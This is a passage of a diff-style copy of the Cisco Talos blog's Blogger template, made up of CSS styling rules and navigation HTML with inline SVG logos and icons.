+}
+.gs-snippet {
+padding-top: 5px !important;
+}
+#uds-searchControl .gsc-tabHeader.gsc-tabhActive {
+background-color: #9EA0A5;
+text-transform: uppercase;
+font-family: "Exo 2",sans-serif;
+}
+#uds-searchControl .gsc-tabHeader.gsc-tabhInactive {
+background-color: #5c656d;
+text-transform: uppercase;
+font-family: "Exo 2",sans-serif;
+}
+#uds-searchControl .gsc-tabHeader.gsc-tabhActive, #uds-searchControl .gsc-tabHeader.gsc-tabhInactive {
+border: none !important;
+border-top-left-radius: 4px;
+border-top-right-radius: 4px;
+font-weight: 600;
+color: #212224;
+padding: 3px 10px;
+margin: 0 2px 0 0;
+}
+.gsc-tabsArea {
+margin-bottom: 0 !important;
+}
+.gsc-above-wrapper-area {
+padding: 5px 0 1px 0 !important;
+border-bottom: 2px solid #9EA0A5 !important;
+}
+#uds-searchControl .gsc-cursor-current-page {
+color: #ffffff !important;
+}
+.gsc-results .gsc-cursor-box .gsc-cursor-page {
+text-decoration: none !important;
+color: #9EA0A5 !important;
+}
+#uds-searchClearResults {
+height: 15px !important;
+width: 15px !important;
+border-width: 2px !important;
+}
+.gsc-result-info {
+color: #ffffff !important;
+}
+.gsc-webResult .gsc-result {
+border-bottom: 1px solid #5c656d !important;
+}
+.gs-per-result-labels {
+text-transform: uppercase;
+font-family: "Exo 2",sans-serif;
+font-size: 9pt;
+color: #9EA0A5 !important;
+font-weight: 500;
+}
+.gs-webResult div.gs-per-result-labels a.gs-label {
+text-transform: uppercase;
+font-family: "Exo 2",sans-serif;
+font-size: 9pt;
+color: #3f7b9f !important;
+font-weight: 700;
+text-decoration: none !important;
+}
+#Navbar1 {display:none!important;}
+## Fix for lightbox preview
+.CSS_LIGHTBOX {
+z-index: 9999 !important;
+}
+#### Edits for EU Cookie Notice
+.cookie-choices-info {
+background-color:#5c656d !important;
+}
+#cookieChoiceInfo {
+z-index:99999 !important;
+}
+.cookie-choices-info .cookie-choices-text{
+color:#fff !important;
+}
+.cookie-choices-info .cookie-choices-button{
+background-color: #ef6f09 !important;
+color:#fff !important;
+}
+/* Styles for the Threat Roundup Posts here */
+.threat-roundup-content table {
+font-weight: 300;
+font-family: 'Roboto', sans-serif;
+font-size: 10pt;
+text-align: left;
+border: none;
+border-collapse: collapse !important;
+width: 100%;
+margin-bottom: 40px;
+}
+.threat-roundup-content table th {
+text-transform: uppercase;
+font-weight: 400;
+background-color: #3e4145;
+color: #b9b9b9;
+}
+.threat-roundup-content table th, .threat-roundup-content table td {
+padding: 4px 8px;
+vertical-align: top;
+}
+.threat-roundup-content table.threats-table td {
+padding-top: 8px;
+padding-bottom: 8px;
+line-height: 1.35em;
+}
+.threat-roundup-content table > tbody > tr:nth-of-type(odd) {
+background-color: #2e3135;
+}
+hr.thin {
+border-color: grey;
+border-style: solid;
+margin: 15px 0;
+}
+.screenshot-section + hr.thin {
+margin-bottom: 40px;
+}
+.threat-roundup-content h2 {
+margin: 40px 0;
+}
+.threat-roundup-content code {
+font-family: 'Fira Mono', monospace;
+color: #f19615;
+font-weight: 300;
+font-size: 8.75pt;
+}
+.threat-roundup-content td code {
+word-break: break-all;
+}
+.threat-name-col {
+color: #f19615;
+font-weight: 400;
+}
+.text-center {
+text-align: center;
+}
+.code {
+background-color: #26282a;
+color: #f19615;
+border: 2px solid #5c656d;
+padding: 20px;
+margin: 10px 0 40px 0;
+}
+.code code {
+line-height: 1.65;
+}
+.threat-table-note {
+font-size: 9pt;
+margin-top: -36px;
+margin-bottom: 36px;
+}
+.coverage-check img {
+width: 20px;
+height: auto;
+margin: -3px 0 !important;
+}
+.coverage-na {
+font-style: italic;
+}
+.threat-coverage-table {
+margin: auto;
+max-width: 400px;
+}
+table.threat-coverage-table td, table.threat-coverage-table th {
+padding: 6px 20px;
+}
+.screenshot-section h4 {
+color: #f19615;
+font-weight: 400;
+margin-bottom: 8px;
+}
+.screenshot-section img {
+margin: 0 auto 40px auto;
+}
+.amp-section img {
+max-width: 350px;
+}
+table.exploit-prev-table {
+margin-top: 40px;
+}
+table.exploit-prev-table td {
+font-size: 8.75pt;
+line-height: 1.5em;
+padding: 8px 8px 16px 8px;
+}
+table.exploit-prev-table td.detection-col {
+font-size: 9.5pt;
+padding: 4px 8px;
+}
+.detection-col .threat-name-col {
+font-weight: 500;
+}
+.button-link {
+box-shadow: none !important;
+}
+.blog-podcast-button {
+border-radius: 2px;
+color: #fff;
+border: none;
+background-color: #5c656d;
+line-height: 2em;
+padding: 4px 16px 4px 12px;
+margin-bottom: 20px;
+margin-top: 10px;
+}
+.blog-podcast-button img {
+width: 20px;
+height: 20px;
+margin: 0;
+float: left;
+padding-right: 4px;
+padding-top: 3px;
+}
+
+--></style>
+<link href='https://www.blogger.com/dyn-css/authorization.css?targetBlogID=1029833275466591797&amp;zx=50bcf755-aca1-40ac-92e1-9e68f5592c1b' media='none' onload='if(media!=&#39;all&#39;)media=&#39;all&#39;' rel='stylesheet'/><noscript><link href='https://www.blogger.com/dyn-css/authorization.css?targetBlogID=1029833275466591797&amp;zx=50bcf755-aca1-40ac-92e1-9e68f5592c1b' rel='stylesheet'/></noscript>
+
+</head>
+<body>
+<div class='no-items section' id='header'></div>
+<!-- Begin Navigation -->
+<nav id='nav'>
+<!-- Top navigation section: Account links / sign in -->
+<div id='top-nav-bar'>
+<ul class='top-nav-links-wrapper'>
+<li>
+</li>
+</ul>
+</div>
+<!-- Main Navigation -->
+<div id='navigation'>
+<div id='mobile-nav-topper'>
+<a href='https://www.talosintelligence.com'>
+<!-- TALOS MOBILE ICON 'O' -->
+<svg height='55px' viewBox='0 0 55 55' width='55px' xmlns='https://www.w3.org/2000/svg' xmlns:xlink='https://www.w3.org/1999/xlink'>
+<g>
+<g class='mobile-nav-home'>
+<path clip-rule='evenodd' d='M45.201,12.343c0.378,0.48,0.758,0.925,1.096,1.401    c2.975,4.207,4.543,8.876,4.494,14.044c-0.05,5.452-1.643,10.386-5.186,14.593c-3.484,4.133-7.929,6.73-13.182,7.895    c-6.313,1.398-12.216,0.275-17.695-3.131c-0.441-0.273-0.847-0.6-1.266-0.904c-0.11-0.078-0.208-0.174-0.337-0.287    c0.127-0.141,0.246-0.27,0.366-0.398c0.887-0.949,1.765-1.904,2.663-2.844c0.114-0.119,0.321-0.217,0.485-0.217    c3.658-0.006,7.318,0,10.975,0.008c3.458,0.006,6.913,0.02,10.369,0.02c0.957,0,1.871-0.193,2.62-0.844    c0.797-0.693,1.157-1.596,1.157-2.643c0.001-7.533,0.003-15.067-0.005-22.601c-0.002-0.309,0.088-0.524,0.3-0.743    C43.098,14.598,44.127,13.49,45.201,12.343' fill='#FFFFFF' fill-rule='evenodd'></path>
+<path clip-rule='evenodd' d='M41.402,8.822c-0.99,1.027-1.994,2.021-2.935,3.072    c-0.312,0.35-0.616,0.416-1.036,0.415c-6.98-0.009-13.957-0.007-20.938-0.007c-2.039,0-3.561,1.514-3.561,3.557    c0,6.504,0.002,13.008,0.006,19.512c0.002,0.973,0.011,1.943,0.004,2.914c0,0.133-0.04,0.301-0.127,0.393    c-1.069,1.162-2.15,2.314-3.229,3.469c-0.021,0.023-0.052,0.039-0.109,0.08c-0.159-0.188-0.323-0.369-0.471-0.562    c-2.535-3.348-4.119-7.102-4.605-11.268c-0.61-5.229,0.194-10.229,2.835-14.839c2.669-4.664,6.655-7.805,11.618-9.75    c3.205-1.257,6.533-1.852,9.977-1.621c4.478,0.298,8.553,1.754,12.227,4.325c0.101,0.072,0.197,0.151,0.291,0.229    C41.364,8.755,41.374,8.778,41.402,8.822' fill='#FFFFFF' fill-rule='evenodd'></path>
+<path clip-rule='evenodd' d='M39.799,12.47c0.873-0.911,1.749-1.829,2.676-2.797    c0.605,0.564,1.195,1.112,1.816,1.691c-0.941,0.985-1.817,1.903-2.703,2.83c-0.276-0.339-0.511-0.688-0.807-0.975    C40.492,12.941,40.145,12.728,39.799,12.47' fill='#FFFFFF' fill-rule='evenodd'></path>
+<path clip-rule='evenodd' d='M10.35,43.279c0.969-1.016,1.885-1.977,2.76-2.893    c0.213,0.369,0.376,0.762,0.639,1.072c0.265,0.312,0.627,0.539,0.98,0.832c-0.853,0.891-1.713,1.791-2.624,2.746    C11.513,44.445,10.939,43.869,10.35,43.279' fill='#FFFFFF' fill-rule='evenodd'></path>
+</g>
+</g>
+</svg>
+<!-- END ICON -->
+</a>
+</div>
+<!-- Cisco | Talos logos -->
+<div class='navigation-logos-wrapper'>
+<div id='cisco-logo-wrapper'></div>
+<div id='talos-logo-wrapper'>
+<a href='https://www.talosintelligence.com'>
+<!-- TALOS LOGO -->
+<svg id='Layer_1' style='enable-background:new 0 0 210.6 61.9;' version='1.1' viewBox='0 0 210.6 61.9' x='0px' xml:space='preserve' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' y='0px'>
+<style type='text/css'>
+	.st0{display:none;}
+	.st1{fill:#006DB6;}
+</style>
+<g class='st0' id='scaffold'>
+</g>
+<g>
+<g>
+<path class='st1' d='M84.5,51.4c-1.7-0.5-3.3-1.1-4.6-2.2c-1.5,1.5-3.4,2.1-5.4,2.1c-3.6,0.1-7.2,0.1-10.8,0.1    c-1.7,0-3.5,0-5.2-0.1c-2.5-0.1-4.6-1-6.3-2.9c-1-1.1-1.5-2.5-1.8-3.9c-0.5-2.6-0.4-5.2,0.5-7.7c1.3-3.4,3.3-6.2,6.4-8.2    c1.7-1.1,3.5-1.6,5.5-1.6c4.8,0,9.6,0,14.4,0c0.1,0,0.3,0,0.4,0c0,1.8,0,3.6,0,5.4c-0.1,0-0.2,0-0.3,0c-4.3,0-8.6,0-12.9,0    c-1.1,0-2.2,0-3.3,0.4c-2.3,0.8-3.8,2.5-4.7,4.6c-0.7,1.7-1,3.5-0.5,5.3c0.6,2.3,2.4,3.5,4.8,3.4c0.3,0,0.7,0,1,0    c3.8,0,7.5,0,11.3,0c0.6,0,1.3-0.1,1.9-0.3c1.8-0.5,2.9-1.8,3.4-3.6c0.2-0.6,0.2-1.2,0.2-1.8c0-3.6,0-7.3,0-10.9    c0-2.7,0-5.5,0-8.2c0-2.6-1.4-4.3-3.7-5.4c-1.1-0.5-2.2-0.6-3.4-0.6c-3.6,0-7.1,0-10.7,0c-0.8,0-1.7,0-2.5,0c-0.1,0-0.3,0-0.4-0.1    c-1.9-1-2.9-2.6-3.2-4.6c0,0,0-0.1,0-0.1c0.1,0,0.2,0,0.3,0c3.2,0,6.4,0,9.6,0c2,0,4-0.1,6-0.1c2.1,0,4.2,0.2,6.2,0.8    c1.8,0.5,3.5,1.3,4.8,2.7c1.5,1.5,2.2,3.3,2.5,5.4c0.1,0.8,0.2,1.7,0.2,2.6c0,4.8,0,9.6,0,14.4c0,3.7,0,7.5,0,11.2    c0,1.2,0,2.5,0,3.7C84.5,51.2,84.5,51.3,84.5,51.4z'></path>
+<path class='st1' d='M198.7,10.6c-0.1,1.6-0.8,2.9-2,3.9c-0.1,0-0.1,0.1-0.2,0.1c-0.6,0.5-1.3,0.7-2.1,0.7c-5.2,0-10.3,0-15.5,0    c-0.9,0-1.8,0.2-2.6,0.8c-0.7,0.6-1,1.3-1.1,2.2c-0.2,2.4-0.3,4.7-0.5,7.1c0,0.6,0.1,1.2,0.5,1.6c0.4,0.6,1,0.9,1.7,0.9    c0.8,0,1.6,0,2.4,0c4.1,0,8.1-0.1,12.2,0.1c2.9,0.1,5.3,1.4,6.7,4.1c0.5,0.9,0.6,2,0.6,3c0,2.3,0,4.7,0,7c0,0.8,0.1,1.6,0,2.4    c-0.3,2.8-2.5,6.3-6.6,6.9c-0.5,0.1-1,0.1-1.4,0.1c-8.2,0-16.3,0-24.5,0c-0.1,0-0.3,0-0.4,0c0.1-0.2,0.1-0.5,0.2-0.7    c0.9-2.2,2.5-3.7,4.6-4.9c0.4-0.2,0.8-0.3,1.2-0.3c3.3,0,6.6,0,9.9,0c2.8,0,5.7,0,8.5,0c1.5,0,2.8-1.1,3-2.6    c0.1-0.8,0.1-1.5,0.1-2.3c0-1.6,0-3.3-0.1-4.9c0-1.4-0.9-2.4-2.3-2.5c-0.2,0-0.4,0-0.6,0c-4.5,0-9.1,0-13.6,0    c-2.4,0-4.5-0.9-6-2.9c-1.1-1.5-1.5-3.2-1.4-5c0.2-2.7,0.3-5.3,0.5-8c0.1-1.2,0.6-2.3,1.2-3.2c1.3-2.1,3.3-3.1,5.7-3.4    c1-0.1,2.1-0.1,3.1-0.1c2.5,0,5.1,0,7.6,0c3.7,0,7.4,0,11,0C198.5,10.6,198.6,10.6,198.7,10.6z'></path>
+<path class='st1' d='M10.2,10.4c12.8,0,25.6,0,38.4,0c-0.1,0.4-0.2,0.7-0.3,1.1c-1,2.5-2.8,3.9-5.4,4.1c-1.3,0.1-2.5,0-3.8,0    c-1.5,0-3,0-4.5,0c-1,0-1.8,0.7-2,1.8c-0.1,0.2-0.1,0.5-0.1,0.7c0,10.9,0,21.9,0,32.8c0,0.1,0,0.2,0,0.4c-0.5-0.1-1-0.1-1.4-0.2    c-1.3-0.3-2.4-0.8-3.3-1.8c-1.1-1.1-1.5-2.5-1.5-4c0-9.1,0-18.3,0-27.4c0-0.7-0.2-1.3-0.7-1.8c-0.4-0.4-0.8-0.6-1.4-0.6    c-1.7,0-3.4,0-5.2,0c-1.1,0-2.1,0-3.2-0.1c-2.8-0.2-5-2.1-5.5-4.7C10.3,10.7,10.2,10.6,10.2,10.4z'></path>
+<path class='st1' d='M92.6,10.6c1.9,0.2,3.5,0.7,4.8,2.1c1,1,1.5,2.3,1.5,3.8c0,7.9,0,15.9,0,23.8c0,1.1,0,2.1,0.3,3.2    c0.3,1.3,1,1.8,2.4,1.8c5.6,0,11.2,0,16.8,0c2.7,0,4.3,1.4,5.2,3.6c0.3,0.8,0.5,1.6,0.5,2.5c-0.1,0-0.2,0-0.3,0    c-8.6,0-17.2,0-25.7,0c-2.8,0-4.9-1.9-5.3-4.7c-0.1-0.4-0.1-0.8-0.1-1.2c0-11.5,0-23,0-34.4C92.6,10.9,92.6,10.8,92.6,10.6z'></path>
+<path class='st1' d='M158.6,17.7c0.3,0.4,0.7,0.8,1,1.2c2.6,3.7,4,7.8,3.9,12.3c0,4.8-1.4,9.1-4.5,12.8c-3,3.6-6.9,5.9-11.5,6.9    c-5.5,1.2-10.7,0.2-15.5-2.7c-0.4-0.2-0.7-0.5-1.1-0.8c-0.1-0.1-0.2-0.2-0.3-0.3c0.1-0.1,0.2-0.2,0.3-0.3c0.8-0.8,1.5-1.7,2.3-2.5    c0.1-0.1,0.3-0.2,0.4-0.2c3.2,0,6.4,0,9.6,0c3,0,6,0,9.1,0c0.8,0,1.6-0.2,2.3-0.7c0.7-0.6,1-1.4,1-2.3c0-6.6,0-13.2,0-19.8    c0-0.3,0.1-0.5,0.3-0.7C156.8,19.7,157.7,18.7,158.6,17.7z'></path>
+<path class='st1' d='M155.3,14.6c-0.9,0.9-1.7,1.8-2.6,2.7c-0.3,0.3-0.5,0.4-0.9,0.4c-6.1,0-12.2,0-18.3,0c-1.8,0-3.1,1.3-3.1,3.1    c0,5.7,0,11.4,0,17.1c0,0.8,0,1.7,0,2.5c0,0.1,0,0.3-0.1,0.3c-0.9,1-1.9,2-2.8,3c0,0,0,0-0.1,0.1c-0.1-0.2-0.3-0.3-0.4-0.5    c-2.2-2.9-3.6-6.2-4-9.9c-0.5-4.6,0.2-9,2.5-13c2.3-4.1,5.8-6.8,10.2-8.5c2.8-1.1,5.7-1.6,8.7-1.4c3.9,0.3,7.5,1.5,10.7,3.8    C155.1,14.4,155.2,14.5,155.3,14.6C155.3,14.5,155.3,14.6,155.3,14.6z'></path>
+<path class='st1' d='M153.9,17.8c0.8-0.8,1.5-1.6,2.3-2.4c0.5,0.5,1,1,1.6,1.5c-0.8,0.9-1.6,1.7-2.4,2.5c-0.2-0.3-0.4-0.6-0.7-0.9    C154.5,18.2,154.2,18,153.9,17.8z'></path>
+<path class='st1' d='M128.1,44.8c0.8-0.9,1.7-1.7,2.4-2.5c0.2,0.3,0.3,0.7,0.6,0.9c0.2,0.3,0.5,0.5,0.9,0.7    c-0.7,0.8-1.5,1.6-2.3,2.4C129.2,45.8,128.7,45.3,128.1,44.8z'></path>
+</g>
+<g>
+<path class='st1' d='M198.3,50h-0.5v1.4h-0.4V50h-0.5v-0.3h1.5L198.3,50L198.3,50z'></path>
+<path class='st1' d='M199,49.6l0.4,1.2l0.4-1.2h0.6v1.7h-0.4V51l0-0.8l-0.4,1.2h-0.3l-0.4-1.2l0,0.8v0.4h-0.4v-1.7L199,49.6    L199,49.6z'></path>
+</g>
+</g>
+</svg>
+<!-- END TALOS LOGO -->
+</a>
+</div>
+</div>
+<!-- Main Site Navigation Links -->
+<div class='navigation-links-wrapper'>
+<ul class='main-nav-list'>
+<!-- Sofware -->
+<li class='nav-item '>
+<div class='primary-link-wrapper'>
+<a class='primary_nav_link' href='https://www.talosintelligence.com/software'>
+<!-- SOFTWARE ICON -->
+<svg height='20px' viewBox='0 0 26 20' width='26px' xmlns='https://www.w3.org/2000/svg' xmlns:xlink='https://www.w3.org/1999/xlink'>
+<g class='nav-icon' id='tools-icon'>
+<path d='M24.7-0.062H1.3C0.583-0.062,0,0.521,0,1.241v17.393c0,0.721,0.583,1.304,1.3,1.304h23.4   c0.719,0,1.3-0.583,1.3-1.304V1.241C26,0.521,25.419-0.062,24.7-0.062z M23.604,13.027c-0.063,0.058-0.151,0.077-0.232,0.052   L20.2,12.104c-0.024-0.008-0.052,0.007-0.06,0.032l-0.806,2.62c-0.008,0.025,0.006,0.048,0.023,0.057l3.201,0.984   c0.08,0.024,0.142,0.091,0.161,0.172c0.02,0.082-0.006,0.169-0.067,0.227c-1.106,1.063-2.77,1.309-4.137,0.609   c-1.207-0.616-1.918-1.825-1.961-3.093L7.858,9.268C6.806,9.976,5.41,10.107,4.202,9.49C3.249,9.002,2.564,8.124,2.328,7.076   C2.309,6.994,2.335,6.907,2.398,6.85c0.062-0.058,0.149-0.078,0.231-0.053l3.172,0.975c0.025,0.008,0.052-0.006,0.06-0.032   l0.805-2.621C6.673,5.094,6.66,5.071,6.642,5.063L3.441,4.078C3.361,4.053,3.3,3.988,3.28,3.906   C3.26,3.824,3.286,3.737,3.347,3.679c1.108-1.063,2.77-1.308,4.138-0.609c1.207,0.618,1.918,1.826,1.961,3.093l8.697,4.445   c1.053-0.708,2.448-0.84,3.655-0.223c0.955,0.488,1.638,1.367,1.876,2.414C23.692,12.883,23.665,12.969,23.604,13.027z' fill='#9EA0A5'></path>
+</g>
+</svg>
+<!-- END ICON -->
+<span>Software</span>
+</a>
+</div>
+</li>
+<!-- Vulnerability Information -->
+<li class='nav-item '>
+<div class='primary-link-wrapper'>
+<a class='primary_nav_link' href='https://www.talosintelligence.com/vulnerability_info'>
+<!-- VULNERABILITY INFO ICON -->
+<svg height='20px' viewBox='0 0 26 20' width='26px' xmlns='https://www.w3.org/2000/svg' xmlns:xlink='https://www.w3.org/1999/xlink'>
+<g class='nav-icon' id='vuln-icon'>
+<path d='M24.256,18.49L13.872,0.503C13.692,0.192,13.36,0,13,0c-0.359,0-0.692,0.192-0.872,0.503L1.744,18.49  c-0.18,0.312-0.18,0.695,0,1.006C1.924,19.809,2.257,20,2.616,20h20.769c0.359,0,0.691-0.191,0.871-0.504  C24.436,19.186,24.436,18.803,24.256,18.49 M14.268,18.215h-2.533v-1.85h2.533V18.215z M14.268,15.441h-2.533L10.89,6.515h4.222  L14.268,15.441z' fill='#9EA0A5'></path>
+</g>
+</svg>
+<!-- END ICON -->
+<span>Vulnerability<span class='break'><br/></span> Information</span>
+</a>
+</div>
+<input class='sub-nav-trigger' id='vuln-sub-trigger' type='checkbox'/>
+<label class='sub-nav-trigger-label' for='vuln-sub-trigger'>
+<!-- SUBNAVIGATION ICON -->
+<svg height='47.75px' viewBox='0 0 48.167 47.75' width='48.167px' xmlns='https://www.w3.org/2000/svg' xmlns:xlink='https://www.w3.org/1999/xlink'>
+<circle cx='24.083' cy='23.875' fill='none' opacity='0.4' r='22' stroke='#FFFFFF' stroke-miterlimit='10'></circle>
+<g>
+<circle cx='24.083' cy='16.068' fill='#FFFFFF' r='2.496'></circle>
+<circle cx='24.083' cy='23.875' fill='#FFFFFF' r='2.496'></circle>
+<circle cx='24.083' cy='31.682' fill='#FFFFFF' r='2.496'></circle>
+</g>
+</svg>
+<!-- END ICON -->
+</label>
+<ul class='sub-nav'>
+<li class='desktop-hide'>
+<a href='https://www.talosintelligence.com/vulnerability_info'>
+<h1>Vulnerability Information</h1>
+</a>
+</li>
+<li class='desktop-hide'><label class='subnav-back-button' for='vuln-sub-trigger'>BACK</label></li>
+<li><a href='https://www.talosintelligence.com/vulnerability_reports'>Vulnerability Reports</a></li>
+<li><a href='https://www.talosintelligence.com/ms_advisories'>Microsoft Advisories</a></li>
+</ul>
+<div class='desktop-hide subnav-overlay'>
+<!-- VULNERABILITY INFO ICON -->
+<svg height='20px' viewBox='0 0 26 20' width='26px' xmlns='https://www.w3.org/2000/svg' xmlns:xlink='https://www.w3.org/1999/xlink'>
+<g class='nav-icon' id='vuln-icon'>
+<path d='M24.256,18.49L13.872,0.503C13.692,0.192,13.36,0,13,0c-0.359,0-0.692,0.192-0.872,0.503L1.744,18.49  c-0.18,0.312-0.18,0.695,0,1.006C1.924,19.809,2.257,20,2.616,20h20.769c0.359,0,0.691-0.191,0.871-0.504  C24.436,19.186,24.436,18.803,24.256,18.49 M14.268,18.215h-2.533v-1.85h2.533V18.215z M14.268,15.441h-2.533L10.89,6.515h4.222  L14.268,15.441z' fill='#9EA0A5'></path>
+</g>
+</svg>
+<!-- END ICON -->
+</div>
+</li>
+<!-- Reputation Center -->
+<li class='nav-item '>
+<div class='primary-link-wrapper'>
+<a class='primary_nav_link' href='https://www.talosintelligence.com/reputation'>
+<!-- REPUTATION CENTER ICON -->
+<svg height='20px' viewBox='0 0 26 20' width='26px' xmlns='https://www.w3.org/2000/svg' xmlns:xlink='https://www.w3.org/1999/xlink'>
+<g class='nav-icon' id='center-icon'>
+<path d='M24.7,0H1.3C0.582,0,0,0.585,0,1.308v17.384C0,19.415,0.582,20,1.3,20h23.4c0.718,0,1.3-0.585,1.3-1.308   V1.308C26,0.585,25.418,0,24.7,0z M21.75,10.5h-1.9c-0.246,3.392-2.958,6.104-6.35,6.35v1.9h-1v-1.9   c-3.392-0.246-6.104-2.958-6.35-6.35h-1.9v-1h1.9c0.246-3.392,2.958-6.104,6.35-6.35v-1.9h1v1.9c3.392,0.246,6.104,2.958,6.35,6.35   h1.9V10.5z' fill='#9EA0A5'></path>
+<path d='M18.85,9.5c-0.241-2.84-2.509-5.108-5.35-5.35v2.184h-1V4.15C9.66,4.392,7.392,6.66,7.15,9.5h2.184v1H7.15   c0.241,2.841,2.509,5.108,5.35,5.35v-2.184h1v2.184c2.841-0.241,5.108-2.509,5.35-5.35h-2.184v-1H18.85z M13,11.984   c-1.096,0-1.984-0.888-1.984-1.984c0-1.096,0.888-1.984,1.984-1.984c1.097,0,1.984,0.888,1.984,1.984   C14.984,11.097,14.097,11.984,13,11.984z' fill='#9EA0A5'></path>
+</g>
+</svg>
+<!-- END ICON -->
+<span>Reputation<span class='break'><br/></span> Center</span>
+</a>
+</div>
+<input class='sub-nav-trigger' id='reputation-sub-trigger' type='checkbox'/>
+<label class='sub-nav-trigger-label' for='reputation-sub-trigger'>
+<!-- SUBNAVIGATION ICON -->
+<svg height='47.75px' viewBox='0 0 48.167 47.75' width='48.167px' xmlns='https://www.w3.org/2000/svg' xmlns:xlink='https://www.w3.org/1999/xlink'>
+<circle cx='24.083' cy='23.875' fill='none' opacity='0.4' r='22' stroke='#FFFFFF' stroke-miterlimit='10'></circle>
+<g>
+<circle cx='24.083' cy='16.068' fill='#FFFFFF' r='2.496'></circle>
+<circle cx='24.083' cy='23.875' fill='#FFFFFF' r='2.496'></circle>
+<circle cx='24.083' cy='31.682' fill='#FFFFFF' r='2.496'></circle>
+</g>
+</svg>
+<!-- END ICON -->
+</label>
+<ul class='sub-nav'>
+<li class='desktop-hide'>
+<a href='https://www.talosintelligence.com/reputation'>
+<h1>Reputation Center</h1>
+</a>
+</li>
+<li class='desktop-hide'><label class='subnav-back-button' for='reputation-sub-trigger'>BACK</label></li>
+<li><a data-method='get' href='https://www.talosintelligence.com/reputation_center'>IP & Domain Reputation</a></li>
+<li><a href='https://www.talosintelligence.com/talos_file_reputation'>Talos File Reputation</a></li>
+<li><a href='https://www.talosintelligence.com/support'>Reputation Support</a></li>
+<li><a href='https://www.talosintelligence.com/amp-naming'>AMP Threat Naming Conventions</a></li>
+<li><a href='https://www.talosintelligence.com/awbo_intro'>AWBO Exercises</a></li>
+<li><a href='https://www.talosintelligence.com/categories'>Intelligence Categories</a></li>
+</ul>
+<div class='desktop-hide subnav-overlay'>
+<!-- REPUTATION CENTER ICON -->
+<svg height='20px' viewBox='0 0 26 20' width='26px' xmlns='https://www.w3.org/2000/svg' xmlns:xlink='https://www.w3.org/1999/xlink'>
+<g class='nav-icon' id='center-icon'>
+<path d='M24.7,0H1.3C0.582,0,0,0.585,0,1.308v17.384C0,19.415,0.582,20,1.3,20h23.4c0.718,0,1.3-0.585,1.3-1.308   V1.308C26,0.585,25.418,0,24.7,0z M21.75,10.5h-1.9c-0.246,3.392-2.958,6.104-6.35,6.35v1.9h-1v-1.9   c-3.392-0.246-6.104-2.958-6.35-6.35h-1.9v-1h1.9c0.246-3.392,2.958-6.104,6.35-6.35v-1.9h1v1.9c3.392,0.246,6.104,2.958,6.35,6.35   h1.9V10.5z' fill='#9EA0A5'></path>
+<path d='M18.85,9.5c-0.241-2.84-2.509-5.108-5.35-5.35v2.184h-1V4.15C9.66,4.392,7.392,6.66,7.15,9.5h2.184v1H7.15   c0.241,2.841,2.509,5.108,5.35,5.35v-2.184h1v2.184c2.841-0.241,5.108-2.509,5.35-5.35h-2.184v-1H18.85z M13,11.984   c-1.096,0-1.984-0.888-1.984-1.984c0-1.096,0.888-1.984,1.984-1.984c1.097,0,1.984,0.888,1.984,1.984   C14.984,11.097,14.097,11.984,13,11.984z' fill='#9EA0A5'></path>
+</g>
+</svg>
+<!-- END ICON -->
+</div>
+</li>
+<!-- Library -->
+<li class='nav-item '>
+<a class='primary_nav_link' href='https://www.talosintelligence.com/resources'>
+<!-- LIBRARY ICON -->
+<svg height='20px' viewBox='0 0 26 20' width='26px' xmlns='https://www.w3.org/2000/svg' xmlns:xlink='https://www.w3.org/1999/xlink'>
+<g class='nav-icon' id='library-icon'>
+<g>
+<rect fill='#9EA0A5' height='0.882' width='5.438' x='7.389' y='9.446'></rect>
+<rect fill='#9EA0A5' height='0.883' width='5.438' x='7.389' y='13.887'></rect>
+<rect fill='#9EA0A5' height='0.882' width='5.438' x='7.389' y='7.226'></rect>
+<rect fill='#9EA0A5' height='0.883' width='5.438' x='7.389' y='11.666'></rect>
+<path d='M24.7,0H1.3C0.583,0,0,0.56,0,1.25v17.499C0,19.44,0.583,20,1.3,20h23.4c0.719,0,1.3-0.56,1.3-1.251V1.25    C26,0.56,25.419,0,24.7,0z M14.32,15.852c0,0.275-0.222,0.498-0.498,0.498H6.665c-0.274,0-0.497-0.223-0.497-0.498V6.144    c0-0.276,0.222-0.499,0.497-0.499h7.157c0.276,0,0.498,0.223,0.498,0.499V15.852z M19.832,13.564c0,0.273-0.222,0.496-0.497,0.496    h-3.768v-1.578h2.771V11.6h-2.771v-1.339h2.771V9.38h-2.771V8.041h2.771V7.159h-2.771V6.144c0-0.111-0.01-0.219-0.03-0.325h2.802    V4.938h-3.257c-0.318-0.332-0.764-0.54-1.26-0.54H11.68V3.856c0-0.275,0.222-0.499,0.498-0.499h7.158    c0.275,0,0.497,0.224,0.497,0.499V13.564z' fill='#9EA0A5'></path>
+</g>
+</g>
+</svg>
+<!-- END ICON -->
+<span>Library</span>
+</a>
+</li>
+<!-- Support -->
+<li class='nav-item'>
+<div class='primary-link-wrapper'>
+<a class='primary_nav_link' href='https://www.talosintelligence.com/community'>
+<!-- SUPPORT ICON -->
+<svg height='20px' viewBox='0 0 26 20' width='26px' xmlns='https://www.w3.org/2000/svg' xmlns:xlink='https://www.w3.org/1999/xlink'>
+<g class='nav-icon' id='community-icon'>
+<g>
+<path d='M24.7-0.062H1.3C0.582-0.062,0,0.521,0,1.241v17.393c0,0.72,0.582,1.304,1.3,1.304h23.4    c0.718,0,1.3-0.584,1.3-1.304V1.241C26,0.521,25.418-0.062,24.7-0.062z M18.911,12.189c0,1.98-5.911,5.461-5.911,5.461    s-5.911-3.208-5.911-5.461c0-2.251,0-8.189,0-8.189L13,2.361L18.911,4C18.911,4,18.911,10.21,18.911,12.189z' fill='#9EA0A5'></path>
+<polygon fill='#9EA0A5' points='9.671,8.763 8.275,10.16 11.77,13.655 13.166,12.259 17.726,7.699 16.384,6.357 11.824,10.917       '></polygon>
+</g>
+</g>
+</svg>
+<!-- END ICON -->
+<span>Support</span>
+</a>
+</div>
+<input class='sub-nav-trigger' id='community-sub-trigger' type='checkbox'/>
+<label class='sub-nav-trigger-label' for='community-sub-trigger'>
+<!-- SUBNAVIGATION ICON -->
+<svg height='47.75px' viewBox='0 0 48.167 47.75' width='48.167px' xmlns='https://www.w3.org/2000/svg' xmlns:xlink='https://www.w3.org/1999/xlink'>
+<circle cx='24.083' cy='23.875' fill='none' opacity='0.4' r='22' stroke='#FFFFFF' stroke-miterlimit='10'></circle>
+<g>
+<circle cx='24.083' cy='16.068' fill='#FFFFFF' r='2.496'></circle>
+<circle cx='24.083' cy='23.875' fill='#FFFFFF' r='2.496'></circle>
+<circle cx='24.083' cy='31.682' fill='#FFFFFF' r='2.496'></circle>
+</g>
